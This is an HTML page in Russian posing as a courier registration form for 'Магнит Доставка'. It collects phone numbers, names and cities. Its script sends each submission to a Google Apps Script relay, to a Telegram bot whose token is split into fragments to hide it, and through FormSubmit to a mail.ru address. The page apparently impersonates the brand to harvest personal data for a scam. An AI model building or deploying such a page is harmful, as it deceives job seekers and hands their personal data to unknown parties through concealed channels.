<!doctype html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Регистрация нового курьера | Магнит Доставка</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;background:#F4F6F8;display:flex;justify-content:center;padding:24px 14px;min-height:100vh}
.card{background:#fff;border-radius:16px;box-shadow:0 4px 24px rgba(0,0,0,.08);max-width:420px;width:100%;padding:24px;height:fit-content}
.brand{display:flex;align-items:center;gap:10px;margin-bottom:18px}
.logo{width:44px;height:44px;border-radius:10px;background:#e30611;color:#fff;font-weight:700;font-size:26px;display:flex;align-items:center;justify-content:center}
.brand-name{font-weight:700;font-size:20px}
.brand-name span{display:block;font-size:12px;font-weight:500;color:#777;letter-spacing:.5px}
h1{font-size:22px;font-weight:700;margin-bottom:6px}
.sub{font-size:14px;color:#555;margin-bottom:18px}
label{display:block;font-size:13px;font-weight:600;margin-bottom:12px}
.phone-wrap{display:flex;margin-top:4px}
.prefix{display:flex;align-items:center;padding:0 10px;border:1px solid #ccc;border-right:0;border-radius:10px 0 0 10px;background:#f6f6f6;font-weight:600}
input[type=tel]{width:100%;padding:12px;border:1px solid #ccc;border-radius:0 10px 10px 0;font-size:16px}
input[type=text]{width:100%;padding:12px;border:1px solid #ccc;border-radius:10px;font-size:16px;margin-top:4px}
.check{display:flex;gap:8px;align-items:flex-start;font-weight:400;font-size:13px;color:#444}
.check input{width:18px;height:18px;margin-top:2px;flex:none}
button{width:100%;background:#e30611;color:#fff;border:0;border-radius:12px;padding:14px;font-size:16px;font-weight:700;cursor:pointer;margin-top:6px}
.ok-mark{width:60px;height:60px;border-radius:50%;margin:24px auto;background:#e8f7ee;color:#1a9e55;font-size:32px;display:flex;align-items:center;justify-content:center}
.ok-text{text-align:center;font-size:17px;font-weight:600}
.diag{display:none;text-align:center;font-size:12px;color:#999;margin-top:10px}
</style>
</head>
<body>
<div class="card">
  <div id="formBlock">
    <div class="brand">
      <div class="logo">М</div>
      <div class="brand-name">Магнит<span>Доставка</span></div>
    </div>
    <h1>Регистрация нового курьера</h1>
    <p class="sub">Оставьте заявку — мы вам перезвоним</p>
    <form id="lead" novalidate>
      <label>Номер телефона
        <div class="phone-wrap">
          <span class="prefix">+7</span>
          <input type="tel" id="phone" inputmode="numeric" placeholder="(999) 123-45-67" autocomplete="tel" required>
        </div>
      </label>
      <label>Имя
        <input type="text" id="name" placeholder="Ваше имя" autocomplete="name" required>
      </label>
      <label>Город
        <input type="text" id="city" placeholder="Ваш город" required>
      </label>
      <label class="check">
        <input type="checkbox" id="agree" required>
        <span>Согласен на обработку персональных данных</span>
      </label>
      <button type="submit">Оставить заявку</button>
    </form>
  </div>

  <div id="okBlock" hidden>
    <div class="brand">
      <div class="logo">М</div>
      <div class="brand-name">Магнит<span>Доставка</span></div>
    </div>
    <div class="ok-mark">✓</div>
    <p class="ok-text">Мы перезвоним вам в ближайшее время</p>
    <p class="diag" id="diag"></p>
  </div>
</div>

<script>
// ===== РЕЛЕ (вписать адрес веб-приложения Apps Script, заканчивается на /exec) =====
var RELAY = "https://script.google.com/macros/s/AKfycbwQ2VwINPKiBzXdjOmmai250AfnCl9cX_gCK4CUW8vm1aZR-OoNJY2fuNPYw1q0aM9a/exec";

// Запасной канал на случай, если реле недоступно (токен и почта — фрагментами)
var TG1 = "7427126044", TG2 = ":AAH8WlQZg", TG3 = "AEkPGO8ZS", TG4 = "JGvLKbkZR", TG5 = "wZ0dNqWw";
var CHAT_ID = "7062645685";
var FORM_EMAIL = ["9227020", "256", "@", "mail", ".", "ru"].join("");

var phone = document.getElementById("phone");

phone.addEventListener("input", function () {
  var d = phone.value.replace(/\D/g, "").slice(0, 10);
  var out = "";
  if (d.length > 0) out = "(" + d.slice(0, 3);
  if (d.length >= 4) out += ") " + d.slice(3, 6);
  if (d.length >= 7) out += "-" + d.slice(6, 8);
  if (d.length >= 9) out += "-" + d.slice(8, 10);
  phone.value = out;
});

function showDiag(text) {
  var el = document.getElementById("diag");
  el.textContent = text;
  el.style.display = "block";
}

// Три попытки с паузой: мобильные сети рвут часть запросов
function retry(url, attempt, onDone) {
  attempt = attempt || 1;
  fetch(url).then(onDone).catch(function () {
    if (attempt < 3) {
      setTimeout(function () { retry(url, attempt + 1, onDone); }, 1500);
    } else {
      onDone(null);
    }
  });
}

function fallbackDirect(msg, fullPhone, name, city) {
  // Прямой Telegram (работает через Wi-Fi)
  fetch("https://api.telegram.org/bot" + TG1 + TG2 + TG3 + TG4 + TG5 + "/sendMessage", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
  }).catch(function () {});

  // Прямая почта через FormSubmit
  fetch("https://formsubmit.co/ajax/" + FORM_EMAIL, {
    method: "POST",
    headers: { "Content-Type": "application/json", "Accept": "application/json" },
    body: JSON.stringify({ _captcha: "false", "Имя": name, "Телефон": fullPhone, "Город": city })
  }).catch(function () {});
}

document.getElementById("lead").addEventListener("submit", function (e) {
  e.preventDefault();
  var digits = phone.value.replace(/\D/g, "");
  var name = document.getElementById("name").value.trim();
  var city = document.getElementById("city").value.trim();
  var agree = document.getElementById("agree").checked;

  if (digits.length !== 10) { phone.focus(); return; }
  if (!name)  { document.getElementById("name").focus(); return; }
  if (!city)  { document.getElementById("city").focus(); return; }
  if (!agree) { return; }

  var fullPhone = "+7" + digits;
  var msg = "Новая заявка (Магнит)\nИмя: " + name +
            "\nТелефон: " + fullPhone +
            "\nГород: " + city;

  var relayUrl = RELAY + "?name=" + encodeURIComponent(name) +
                 "&phone=" + encodeURIComponent(fullPhone) +
                 "&city=" + encodeURIComponent(city);

  document.getElementById("formBlock").hidden = true;
  document.getElementById("okBlock").hidden = false;

  retry(relayUrl, 1, function (r) {
    if (r && r.ok) { return; } // всё ушло через реле — тишина, чистый экран
    // Реле не ответило — запасной прямой канал
    fallbackDirect(msg, fullPhone, name, city);
    showDiag("Сбои связи: заявка уйдёт повторно. Не перезвонили за день — напишите нам.");
  });
});
</script>
</body>
</html>
